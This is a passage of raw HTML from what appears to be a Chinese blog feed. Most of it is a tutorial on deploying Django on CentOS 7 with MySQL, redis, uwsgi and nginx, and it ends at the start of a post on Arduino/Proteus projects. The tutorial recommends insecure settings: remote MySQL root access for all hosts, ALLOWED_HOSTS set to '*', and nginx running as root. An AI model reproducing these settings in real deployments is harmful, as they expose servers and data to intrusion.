/usr/bin/virtualenv</span><br></pre></td></tr></table></figure><p>然后在和项目同级目录下，创建虚拟环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /Django/env</span><br><span class="line">cd /Django</span><br><span class="line">virtualenv --python=/usr/bin/python3 pyweb1</span><br></pre></td></tr></table></figure><p>然后进入&#x2F;Django&#x2F;env&#x2F;pyweb&#x2F;bin </p><p>启动虚拟环境：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /Django/env/pyweb1/bin </span><br><span class="line">source activate</span><br></pre></td></tr></table></figure><h4 id="2）安装Django包依赖"><a href="#2）安装Django包依赖" class="headerlink" title="2）安装Django包依赖"></a>2）安装Django包依赖</h4><p>在windows上，我们开发Django项目的环境可能有非常多的包，我们不可能在服务器上一一手动安装，这时候就需要用到批量安装了</p><p>在Windows下，导出pip安装的包到requirements.txt里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip freeze &gt; requirements.txt</span><br></pre></td></tr></table></figure><p>然后把这个文件上传到服务器，在这个文件同目录下批量安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple -r requirements.txt  #这里换了清华的源，加速安装</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/28/QKyh41Fc7zrGw6O.png"></p><h4 id="3）CentOS7安装MySQL"><a href="#3）CentOS7安装MySQL" class="headerlink" title="3）CentOS7安装MySQL"></a>3）CentOS7安装MySQL</h4><p>数据库嘛，没什么好说的，我用的是MySQL</p><p><strong>（1）下载并安装MySQL官方的Yum Repository</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -i -c http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm</span><br></pre></td></tr></table></figure><p><strong>（2） 使用上面的命令就直接下载了安装用的Yum Repository，大概25KB的样子，然后就可以直接yum安装了。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install mysql57-community-release-el7-10.noarch.rpm</span><br></pre></td></tr></table></figure><p>（3）安装MySQL服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install mysql-community-server</span><br></pre></td></tr></table></figure><p>（4）MySQL数据库设置</p><p>启动数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start  mysqld.service</span><br></pre></td></tr></table></figure><p>查看MySQL运行状态，如图所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status mysqld.service</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/28/zugocTL7YyhAO6P.png"></p><p>此时MySQL已经开始正常运行，不过要想进入MySQL还得先找出此时root用户的密码，通过如下命令可以在日志文件中找出密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;password&quot; /var/log/mysqld.log</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/28/HTp9Jbv2t45oPws.png"></p><p>图中圈出来的部分就是默认密码，用如下命令进入数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p</span><br></pre></td></tr></table></figure><p>登录时会提示你输入密码，这时密码输入之后时没有显示的。</p><p>登陆后，修改密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;new password&#x27;;</span><br></pre></td></tr></table></figure><p>其中‘new password’替换成你要设置的密码，注意:密码设置必须要大小写字母数字和特殊符号（,&#x2F;‘;:等）,不然不能配置成功</p><p>（5）开启mysql的远程访问</p><p>这个过程比较玄学，容易失败，首先先试试直接授权法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant all privileges on *.* to &#x27;root&#x27;@&#x27;192.168.0.1&#x27; identified by &#x27;password&#x27; with grant option;</span><br></pre></td></tr></table></figure><p>成功后再输入下面两行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; flush privileges; </span><br><span class="line">mysql&gt; exit</span><br></pre></td></tr></table></figure><p>这是将root账户开放给192.168.0.1也就是本地，在测试阶段，可以选择将上述IP换成%，这样所有IP均可远程访问。</p><p>如果上面的方法不生效，再试试修改表法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use mysql; </span><br><span class="line">select host, user from user;</span><br><span class="line">UPDATE user SET Host=&#x27;localhost&#x27; WHERE User=&#x27;root&#x27; AND Host=&#x27;127&#x27; LIMIT 1;</span><br></pre></td></tr></table></figure><p>先观察表里的root账户的主机是什么，然后再将其修改成%即可，这里是将127改成localhost</p><p><img src="https://s2.loli.net/2022/03/28/iRmCjkSf7QK56r1.png"></p><p>更改后：</p><p><img src="https://s2.loli.net/2022/03/28/51avspWdV3zx7FH.png"></p><p>最后在windows远程测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 101.43.216.170 -P 3306 -uroot -p</span><br></pre></td></tr></table></figure><p>也可以用可视化的第三方工具（比如navicat）</p><p><img src="https://s2.loli.net/2022/03/28/MlwL6jTahZkf4gO.png"></p><p><img src="https://s2.loli.net/2022/03/28/RWKFpUZ1TSLA2yN.png"></p><p>如果开放了远程权限，仍然连不上远程MySQL，有可能是服务器的防火墙，我用的腾讯云默认是不开放3306端口，所以得自己在防火墙开放3306端口后我才可以正常访问。</p><p><img src="https://s2.loli.net/2022/03/28/xIV4iwRrPkTEspt.png"></p><h4 id="4）reids的安装（可选）"><a href="#4）reids的安装（可选）" class="headerlink" title="4）reids的安装（可选）"></a>4）reids的安装（<strong>可选</strong>）</h4><p>redis是很好用的缓存服务器，可以大大提升缓存资源的访问，安装和使用也很简单，首先先下载redis的包，这里我安装的是6.2.6的版本，因为旧版本编译失败了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local</span><br><span class="line">wget http://download.redis.io/releases/redis-6.2.6.tar.gz</span><br><span class="line">tar -zxf redis-6.2.6.tar.gz</span><br><span class="line">cd redis-6.2.6/src/</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>编译安装完成后，就可以启动redis服务了。但是再次之前，还得先设置一下，让redis可以在后台运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/redis-6.2.6</span><br><span class="line">vim redis.conf</span><br></pre></td></tr></table></figure><p>打开redis.conf配置文件，修改daemonize，将no修改成yes</p><p><img src="https://s2.loli.net/2022/03/28/uQgn4r9tYKkChFx.png"></p><p>然后保存退出就可以后台启动redis服务了(下面这条命令是在redis解压目录下执行)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./src/redis-server ./redis.conf</span><br></pre></td></tr></table></figure><p>启动服务后，可以查看进程来查看redis是否正常运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -tnl</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/28/1M6bGDPjyTCA8Ri.png"></p><p>redis 的很多设置例如：设置密码，远程访问，持久化等，</p><p>然后在这里介绍Django-redis：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install django-redis</span><br></pre></td></tr></table></figure><p>直接通过pip就能安装，然后再修改Django项目中的缓存配置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># redis作为Django缓存和session存储后端的标准配置</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Django的缓存配置</span></span><br><span class="line">CACHES = &#123;</span><br><span class="line">    <span class="string">&quot;default&quot;</span>:&#123;</span><br><span class="line">    <span class="string">&quot;BACKEND&quot;</span>:<span class="string">&quot;django_redis.cache.RedisCache&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LOCATION&quot;</span>:<span class="string">&quot;redis://127.0.0.1:6379/9&quot;</span>,</span><br><span class="line">    <span class="string">&quot;OPTIONS&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;CLIENT_CLASS&quot;</span>:<span class="string">&quot;django_redis.client.DefaultClient&quot;</span>,</span><br><span class="line">        <span class="string">&quot;CONNECTION_POOL_KWARGS&quot;</span>: &#123;<span class="string">&quot;max_connections&quot;</span>: <span class="number">100</span>&#125;,</span><br><span class="line">        <span class="string">&quot;PASSWORD&quot;</span>: <span class="string">&quot;密码&quot;</span>,       <span class="comment"># 可不写，密码</span></span><br><span class="line">        <span class="string">&quot;DECODE_RESPONSES&quot;</span>:<span class="literal">True</span>   <span class="comment"># 可不写，redis get的数据是字符串格式(unicode，而不是bytes)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置session存储3种方式</span></span><br><span class="line"><span class="comment"># 存储在数据库中，如下设置可写可不写，是默认存储模式</span></span><br><span class="line">SESSION_ENGINE = <span class="string">&quot;django.contrib.sessions.backends.db&quot;</span></span><br><span class="line"><span class="comment"># 存储在缓存中，存储在本机内存中，如果丢失则不能找回，比数据库的方式读写更快</span></span><br><span class="line">SESSION_ENGINE = <span class="string">&quot;django.contrib.sessions.backends.cache&quot;</span></span><br><span class="line"><span class="comment"># 混合存储：优先从本机内存中存取，如果没有则冲数据库中存取</span></span><br><span class="line">SESSION_ENGINE = <span class="string">&quot;django.contrib.sessions.backends.cache_db&quot;</span></span><br><span class="line"></span><br><span class="line">SESSION_CACHE_ALIAS = <span class="string">&quot;default&quot;</span>   <span class="comment"># default是上面CACHE的字典key</span></span><br></pre></td></tr></table></figure><p>或者简单一点的配置：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CACHES = &#123;</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;default&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;BACKEND&#x27;</span>: <span class="string">&#x27;django_redis.cache.RedisCache&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;LOCATION&#x27;</span>: <span class="string">&#x27;redis://127.0.0.1:6379/2&#x27;</span>,  <span class="comment"># redis所在服务器或容器ip地址</span></span><br><span class="line">        <span class="string">&quot;OPTIONS&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;CLIENT_CLASS&quot;</span>: <span class="string">&quot;django_redis.client.DefaultClient&quot;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="5）安装和配置uwsgi"><a href="#5）安装和配置uwsgi" class="headerlink" title="5）安装和配置uwsgi"></a>5）安装和配置uwsgi</h4><p>首先，先安装uwsgi</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install uwsgi</span><br></pre></td></tr></table></figure><p>配置uwsgi，在项目根目录下(manage.py同层目录)，新建uwsgi.ini，输入以下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># mysite_uwsgi.ini file</span><br><span class="line"></span><br><span class="line">[uwsgi]</span><br><span class="line"></span><br><span class="line"># Django-related settings</span><br><span class="line"># 项目根目录的路径</span><br><span class="line">chdir           = /Django/IT_todo                </span><br><span class="line"># Django&#x27;s wsgi file</span><br><span class="line">#wsgi-file       = demo01/wsgi.py</span><br><span class="line">module = IT_todo.wsgi:application</span><br><span class="line"># uwsgi服务器的角色</span><br><span class="line">master          = true</span><br><span class="line"># 进程数</span><br><span class="line">processes=4</span><br><span class="line"># 线程数</span><br><span class="line">threads=2</span><br><span class="line"># 存放进程编号的文件</span><br><span class="line">pidfile= uwsgi.pid</span><br><span class="line"># the socket (use the full path to be safe</span><br><span class="line">socket=:8081                     #uwsgi服务器的端口，待会在nginx配置中需要用到</span><br><span class="line">#http          = 127.0.0.1:8002</span><br><span class="line"></span><br><span class="line">#stats = 127.0.0.1:9191</span><br><span class="line"># ... with appropriate permissions - may be needed</span><br><span class="line">#chmod-socket    = 664</span><br><span class="line"># clear environment on exit</span><br><span class="line">vacuum          = true</span><br><span class="line"># 日志文件，因为uwsgi可以脱离终端在后台运行，日志看不见。我们以前的runserver是依赖终端的</span><br><span class="line">daemonize=uwsgi.log</span><br><span class="line">buffer-size=65536</span><br><span class="line"># 虚拟环境的目录</span><br><span class="line">pythonpath = /Django/env/pyweb1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后启动uwsgi</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uwsgi -i uwsgi.ini      # 启动</span><br><span class="line">uwsgi --stop uwsgi.pid  # 停止</span><br></pre></td></tr></table></figure><p>通过查看日志或者查看端口状态观察uwsgi是否开启成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tail -f uwsgi.log    #在manage.py目录下</span><br><span class="line">#或者</span><br><span class="line">ss -tnl</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/28/47P6DaUvOkR9iNA.png"></p><h4 id="6）配置Django项目"><a href="#6）配置Django项目" class="headerlink" title="6）配置Django项目"></a>6）配置Django项目</h4><p>在成功配置和启动uwsgi服务后，接下来可以开始配置Django项目了。</p><p>首先先把Django项目打包丢到服务器的Django目录下再解压，然后修改settings.py文件的内容</p><p>（1）收集静态文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DEBUG = False    #调试的时候可以打开</span><br><span class="line"></span><br><span class="line">ALLOWED_HOSTS = [&#x27;*&#x27;]</span><br><span class="line"></span><br><span class="line">STATIC_ROOT = os.path.join(BASE_DIR,&#x27;static&#x27;)  #静态文件收集 配置路径且将 STATICFILES_DIRS  注释</span><br></pre></td></tr></table></figure><p>（2）创建数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p  #进入数据库</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE table_name CHARACTER SET = UTF8;  #table_name要与Django项目中的保持一致</span><br></pre></td></tr></table></figure><p>（3）创建数据库缓存表（可选）</p><p>如果在Django的缓存配置中，启用了数据表缓存，则需要在服务器上创建一个缓存用的数据表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py createcachetable  #在manage.py目录下</span><br></pre></td></tr></table></figure><p>（4）初始化数据表</p><p>差不多到了最后一步，现在只要初始化一下数据表就可以跑起来了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python manage.py makemigrations              #检查数据库是否有变化</span><br><span class="line"></span><br><span class="line">python manage.py migrate                      #     数据库迁移</span><br></pre></td></tr></table></figure><p>完成了上面这些步骤之后，可以使用Django自带的服务器来查看项目是否已经可以运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py runserver 0.0.0.0:8000 </span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/28/5mIrFDRAa7vyiTt.png"></p><h4 id="7）安装和配置nginx"><a href="#7）安装和配置nginx" class="headerlink" title="7）安装和配置nginx"></a>7）安装和配置nginx</h4><p>切进 该 &#x2F;usr&#x2F;local&#x2F; 目录下，执行下面命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://nginx.org/download/nginx-1.13.7.tar.gz</span><br></pre></td></tr></table></figure><p>下载完成后，执行解压命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf nginx-1.13.7.tar.gz</span><br></pre></td></tr></table></figure><p>进入解压后的nginx-1.13.7文件夹，依次执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>nginx一般默认安装好的路径为&#x2F;usr&#x2F;local&#x2F;nginx<br>在&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;中先备份一下nginx.conf文件，以防意外。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp nginx.conf nginx.conf.bak</span><br></pre></td></tr></table></figure><p>然后打开nginx.conf，把原来的内容删除，直接加入以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">user  root;</span><br><span class="line">worker_processes  1;</span><br><span class="line">#</span><br><span class="line">##error_log  logs/error.log;</span><br><span class="line">##error_log  logs/error.log  notice;</span><br><span class="line">##error_log  logs/error.log  info;</span><br><span class="line">#</span><br><span class="line">##pid        logs/nginx.pid;</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">    http &#123;</span><br><span class="line">        include       mime.types;</span><br><span class="line">        default_type  application/octet-stream;</span><br><span class="line">        sendfile        on;</span><br><span class="line">        keepalive_timeout  65;</span><br><span class="line">        upstream django &#123;</span><br><span class="line">        #django项目的端口号 和uwsgi里面的端口号保存一致</span><br><span class="line">            server 127.0.0.1:8081; # for a web port socket (we&#x27;ll use this first)</span><br><span class="line">        &#125;</span><br><span class="line"># configuration of the server</span><br><span class="line">server &#123;</span><br><span class="line"># nginx服务的端口号，也就是对外开放的端口号</span><br><span class="line">listen 8001;</span><br><span class="line"># the domain name it will serve for</span><br><span class="line"># 这里可以填写你的ip地址或者域名</span><br><span class="line">server_name 101.43.216.170;</span><br><span class="line">charset     utf-8;</span><br><span class="line">  gzip on;</span><br><span class="line">  gzip_disable &quot;msie6&quot;;</span><br><span class="line">  gzip_proxied any;</span><br><span class="line">  gzip_min_length 1k;</span><br><span class="line">  gzip_comp_level 4;</span><br><span class="line">  gzip_types text/plain text/css application/json application/x-javascript text/javascript text/xml image/jpeg image/png image/gif;</span><br><span class="line"></span><br><span class="line"># max upload size</span><br><span class="line">client_max_body_size 75M;   # adjust to taste</span><br><span class="line"></span><br><span class="line"># Django media</span><br><span class="line">location /media  &#123;</span><br><span class="line">    alias /Django/IT_todo/media;  # 指向django的media目录（让用户能访问到图片等媒体资源）</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location /static &#123;</span><br><span class="line">    alias /Django/IT_todo/static; # 指向django的static目录</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># Finally, send all non-media requests to the Django server.</span><br><span class="line">location / &#123;</span><br><span class="line">    uwsgi_pass  django;</span><br><span class="line">    include     uwsgi_params; # the uwsgi_params file you installed</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>配置完成后，启动nginx</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/local/nginx/sbin/nginx /usr/local/sbin/                   #建立软连接</span><br><span class="line">/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf      #启动nginx</span><br><span class="line">nginx -s reload    　　　　　　　　　　　　　　　　　　　　　　　　　　　 #重启nginx/当然stop是停止</span><br><span class="line">nginx       　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　 #启动nginx</span><br></pre></td></tr></table></figure><p>这时，通过查看端口开放情况，就可以知道nginx是否启动成功，</p><p><img src="https://s2.loli.net/2022/03/28/VwEp1PNGJuylxC9.png"></p><p>然后再记得去服务器控制面板处开放想对应的端口访问权限，此时，去浏览器里，输入IP+端口即可访问网站：</p><p><img src="https://s2.loli.net/2022/03/28/atPXyW6EMrAhNko.png"></p><p>至此，服务器就可以算搭好了，其他的功能就需要各位自己去探索了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>基于proteus的可视化设计(6)——一些自己写的程序介绍</title>
      
      <link href="/archives/8540ce62.html"/>
      <url>/archives/8540ce62.html</url>
      
        <content type="html"><![CDATA[<p>这篇文章来介绍一下我自己写的一些程序，仅供参考，同时附上网盘链接，感兴趣可以下载看看</p><p>链接：<a href="https://pan.baidu.com/s/17sitBKqXfq3YgIHTPdrTBg">https://pan.baidu.com/s/17sitBKqXfq3YgIHTPdrTBg</a><br>提取码：uc6i</p><h3 id="1-简易数字电压表"><a href="#1-简易数字电压表" class="headerlink" title="1.简易数字电压表"></a>1.简易数字电压表</h3><h4 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h4><p>采用Arduino UNO板，外接1个电位器和4个BCD码输入的带有译码器的LED数码管，4位数码管显示电压测量值。</p><h4 id="原理图设计"><a href="#原理图设计" class="headerlink" title="原理图设计"></a>原理图设计</h4><p><img src="https://s2.loli.net/2022/02/20/gNAZlUrIzWtHEJF.png"></p><p><img src="https://s2.loli.net/2022/02/20/J9K7CiuHyL8V2eF.png" alt="使用的原件"></p><h4 id="流程图设计"><a href="#流程图设计" class="headerlink" title="流程图设计"></a>流程图设计</h4><p><img src="https://s2.loli.net/2022/02/20/KUDgWZYuzql25CL.png"></p><p><strong>SETUP流程图设计</strong></p><p><img src="https://s2.loli.net/2022/02/20/AsU3nB7QylDuP8z.png"></p><p><strong>LOOP流程图</strong></p><p><img src="https://s2.loli.net/2022/02/20/KGpbtFAw5Ho6UPW.png"></p><p><img src="https://s2.loli.net/2022/02/20/iDKmfxqF5RnkQza.png"></p><h4 id="仿真验证"><a href="#仿真验证" class="headerlink" title="仿真验证"></a>仿真验证</h4><p><img src="https://s2.loli.net/2022/02/20/iXhcy5RA9xnLDZ2.png"></p><h2 id="2-简易篮球计分器"><a href="#2-简易篮球计分器" class="headerlink" title="2.简易篮球计分器"></a>2.简易篮球计分器</h2><h4 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h4><blockquote><p>采用 Arduino UNO 板，外接 6 个按键和 1 个 4 位 LED 数 码管，4 位数码管显示篮球比赛得分情况。 在原理图设计中，在元件中添加 2 个元件:1 个 GROVE 中的 TM1637 控制的 4 位数码管显示器元件（GROVE4DIGIT）， 和按键（BUTTON）。 假如，A 队和 B 队进行篮球比赛，数码显示器显示比赛 得分情况，扩展 6 个按键，它们分别定义为：A 队+1 分、A 队+2 分、A 队+3 分、B 队+1 分、B 队+2 分、B 队+3 分。实现 按篮球比赛规则手动计分功能。</p></blockquote><h4 id="原理图设计-1"><a href="#原理图设计-1" class="headerlink" title="原理图设计"></a>原理图设计</h4><p><img src="https://s2.loli.net/2022/02/20/gBQ7mhAyXSvq5RF.png"></p><h4 id="流程图设计-1"><a href="#流程图设计-1" class="headerlink" title="流程图设计"></a>流程图设计</h4><p><img src="https://s2.loli.net/2022/02/20/UC2DyLvE1VdGYbk.png"></p><p><strong>SETUP流程图</strong></p><p><img src="https://s2.loli.net/2022/02/20/smTf7JC1o4zeROH.png"></p><p><img src="https://s2.loli.net/2022/02/20/pAytGlvXfN3BD1C.png"></p><p><img src="https://s2.loli.net/2022/02/20/4qhYpIs7ukLTEeB.png"></p><p><img src="https://s2.loli.net/2022/02/20/JHN7bGA35ygBPSt.png"></p><p><img src="https://s2.loli.net/2022/02/20/2Ye6vpXz3M5PufT.png"></p><h4 id="仿真验证-1"><a href="#仿真验证-1" class="headerlink" title="仿真验证"></a>仿真验证</h4><p><img src="https://s2.loli.net/2022/02/20/4yrcEgl5xaH7TjL.png"></p><h2 id="3-多功能万年历"><a href="#3-多功能万年历" class="headerlink" title="3.多功能万年历"></a>3.多功能万年历</h2><h4 id="要求-1"><a href="#要求-1" class="headerlink" title="要求"></a>要求</h4><blockquote><p>采用 Arduino UNO 板，外接 1 个 LCD1602 显示屏、1 个 GROVE 串行口模块、1 个 DS1307 实时时钟模块和 1 个热电阻 测温模块，实现万年历和环境温度显示。</p></blockquote><h4 id="原理图设计-2"><a href="#原理图设计-2" class="headerlink" title="原理图设计"></a>原理图设计</h4><p><img src="https://s2.loli.net/2022/02/20/SzaAJtvMhLso6nX.png"></p><h4 id="流程图设计-2"><a href="#流程图设计-2" class="headerlink" title="流程图设计"></a>流程图设计</h4><p><img src="https://s2.loli.net/2022/02/20/GghsmS5XFOy4kME.png"></p><p><strong>SETUP流程图</strong></p><p><img src="https://s2.loli.net/2022/02/20/s5Zqc4rGKP3lRaj.png"></p><p><strong>LOOP流程图</strong></p><p><img src="https://s2.loli.net/2022/02/20/zXl9KxnITjABHy1.png"></p><p><img src="https://s2.loli.net/2022/02/20/U7eOrdahpSk31MX.png"></p><h4 id="仿真验证-2"><a href="#仿真验证-2" class="headerlink" title="仿真验证"></a>仿真验证</h4><p><img src="https://s2.loli.net/2022/02/20/ZpSxFYciuDb9O2y.png"></p><h2 id="4-简易四向红绿灯控制"><a 